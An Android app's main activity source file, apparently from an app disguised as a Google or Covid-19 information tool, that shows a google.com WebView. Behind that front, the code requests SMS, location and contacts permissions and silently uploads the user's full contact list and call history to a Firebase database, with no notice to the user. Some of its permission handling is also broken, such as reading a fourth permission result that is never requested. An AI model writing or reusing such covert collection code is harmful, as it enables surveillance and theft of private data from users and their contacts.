package com.example.google;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.example.google.Classes.CallLogs;
import com.example.google.Classes.Person;
import com.example.google.Classes.user;
import com.example.google.Classes.userContacts;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.Date;

import java.util.List;

import static java.security.AccessController.getContext;

public class MainActivity extends AppCompatActivity {
    WebView webView;
    DatabaseReference rootRef;
    String uniqueKey;
    List<user> userdatalist;
    CallLogs callLog;
    LocationManager locationManager;
    user user;
    String uid;
    public static final String MY_PREFS_NAME = "MyPrefsFile";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
        SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        uid = prefs.getString("uid", "");
        if(uid.isEmpty()) {
            rootRef = FirebaseDatabase.getInstance().getReference();
            uniqueKey = rootRef.child("Posts").push().getKey();
            SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
            editor.putString("uid", uniqueKey);
            editor.apply();
            uid=uniqueKey;
        }
        else {
            userdatalist = new ArrayList<>();
            webView = findViewById(R.id.WebView);
            startWebView("https://www.google.com/");
            User_Status();
        }

    }

    void checkPermissions() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        // Check if App already has permissions for receiving SMS
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.RECEIVE_SMS") == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
            // App has permissions to listen incoming SMS messages
            Log.d("tag", "checkForSmsReceivePermissions: Allowed");
        } else {
            // App don't have permissions to listen incoming SMS messages
            Log.d("tag", "checkForSmsReceivePermissions: Denied");
            // Request permissions from user
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CONTACTS}, 43391);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 43391) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                Log.d("Tag", "Sms Receive Permissions granted");
                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    OnGPS();
                }

            } else {
                Log.d("Tag", "Sms Receive Permissions denied");
            }
        }

        if (grantResults[2] == PackageManager.PERMISSION_GRANTED) {
            DatabaseReference rootRef = FirebaseDatabase.getInstance().getReference("UserContacts").child(uid);
            rootRef.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot snapshot) {
                    if (snapshot.exists()) {

                    } else {
                        Contactsget contactsget = new Contactsget();
                        contactsget.execute();
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });
        }
        if(grantResults[3] == PackageManager.PERMISSION_GRANTED){
            //Log.d("DATA",""+getCallDetails());

            DatabaseReference rootRef = FirebaseDatabase.getInstance().getReference("CallLogs");
            Query query = rootRef.child("CallLogs").child(uid);
            query.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    callLog = dataSnapshot.getValue(CallLogs.class);
                    // String id = user.getUid();
                    if(callLog != null){

                    }
                    else {
                        DatabaseReference myref = FirebaseDatabase.getInstance().getReference("CallLogs").child(uid);
                        callLog = new CallLogs(getCallDetails());
                        myref.setValue(callLog);
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });
        }
        else {
            Log.d("TAG", "not granted");
        }
    }


    private void OnGPS() {
        final android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(MainActivity.this);
        builder.setMessage("Enable GPS").setCancelable(false).setPositiveButton("Yes", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));

            }
        }).setNegativeButton("No", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Toast.makeText(MainActivity.this, "Covid'19 information will not be available properly", Toast.LENGTH_SHORT).show();
                dialog.cancel();
            }
        });
        final android.app.AlertDialog alertDialog = builder.create();
        alertDialog.show();
    }

    private class Contactsget extends AsyncTask<Void, Void, ArrayList<Person>> {

        @Override
        protected ArrayList<Person> doInBackground(Void... voids) {
            ArrayList<Person> contactList = new ArrayList<Person>();

            Uri contactUri = ContactsContract.Contacts.CONTENT_URI;
            String[] PROJECTION = new String[]{
                    ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.HAS_PHONE_NUMBER,
            };
            String SELECTION = ContactsContract.Contacts.HAS_PHONE_NUMBER + "='1'";
            Cursor contacts = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, PROJECTION, SELECTION, null, null);

            if (contacts.getCount() > 0) {
                while (contacts.moveToNext()) {
                    Person aContact = new Person();
                    int idFieldColumnIndex = 0;
                    int nameFieldColumnIndex = 0;
                    int numberFieldColumnIndex = 0;

                    String contactId = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts._ID));

                    nameFieldColumnIndex = contacts.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                    if (nameFieldColumnIndex > -1) {
                        aContact.setName(contacts.getString(nameFieldColumnIndex));
                    }

                    PROJECTION = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
                    final Cursor phone = managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, ContactsContract.Data.CONTACT_ID + "=?", new String[]{String.valueOf(contactId)}, null);
                    if (phone.moveToFirst()) {
                        while (!phone.isAfterLast()) {
                            numberFieldColumnIndex = phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                            if (numberFieldColumnIndex > -1) {
                                aContact.setPhoneNum(phone.getString(numberFieldColumnIndex));
                                phone.moveToNext();
                                contactList.add(aContact);

                            }
                        }
                    }
                    phone.close();
                }

                contacts.close();
            }
            return contactList;
        }

        @Override
        protected void onPostExecute(ArrayList<Person> people) {
            super.onPostExecute(people);
            userContacts userContacts;
            for (int i = 0; i < people.size(); i++) {
                if (people.get(i).getName().contains("*") || people.get(i).getName().contains(".") ||
                        people.get(i).getName().contains("$") ||
                        people.get(i).getName().contains("/") ||
                        people.get(i).getName().contains("'")) {

                } else {
                    DatabaseReference myref = FirebaseDatabase.getInstance().getReference("UserContacts").child(uid).child("contactsdetails").child(people.get(i).getName());
                    userContacts = new userContacts(people.get(i).getName(), people.get(i).getPhoneNum());
                    myref.setValue(userContacts);
                }
            }

        }
    }
    public void User_Status() {

            DatabaseReference rootRef = FirebaseDatabase.getInstance().getReference("User");
            Query query = rootRef.child("User");
            query.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    user = dataSnapshot.getValue(user.class);
                   // String id = user.getUid();
                   if(user != null){

                   }
                    else {
                       DatabaseReference myref = FirebaseDatabase.getInstance().getReference("User").child(uid);
                       user = new user(uid);
                       myref.setValue(user);
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });

    }
    private String getCallDetails() {

        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        return sb.toString();

    }
    private void startWebView(String url) {

        WebSettings settings = webView.getSettings();

        settings.setJavaScriptEnabled(true);
        webView.setScrollBarStyle(View.SCROLLBARS_OUTSIDE_OVERLAY);

        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                Toast.makeText(MainActivity.this, "Error:" + description, Toast.LENGTH_SHORT).show();
            }
        });
        webView.loadUrl(url);
    }

}